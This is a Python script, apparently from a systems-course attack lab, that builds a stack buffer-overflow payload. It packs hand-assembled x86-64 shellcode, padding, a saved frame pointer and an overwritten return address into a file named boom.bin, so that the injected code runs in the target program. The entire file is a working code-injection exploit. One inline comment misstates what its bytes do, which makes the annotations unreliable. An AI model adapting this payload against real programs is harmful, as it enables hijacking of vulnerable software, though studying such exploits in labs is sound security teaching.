import sys

shellcode = b'\xb8\x44\x33\x22\x11' # mov $0x11223344,%eax
shellcode += b'\xa3\x28\xd9\xff\xff\xff\x7f\x00\x00' # movabs %eax,0x7fffffffd928
shellcode += b'\x48\xc7\xc0\x2d\x00\x00\x00'  # mov $0x404030,%rdx
shellcode += b'\x68\xc5\x12\x40\x00'  # push   0x4012c5
shellcode += b'\xc3'  # ret

buf_addr = 0x7fffffffd940
RBP_value = 0x7fffffffd980

buf_size = 32
padding_size = buf_size - len(shellcode)

payload = shellcode
payload += b'A' * padding_size
payload += RBP_value.to_bytes(8, byteorder='little')
payload += buf_addr.to_bytes(8, byteorder='little')  # 覆盖返回地址

with open(r'./payload/boom.bin', 'wb') as f:
    f.write(payload)

print("Payload written to boom.bin")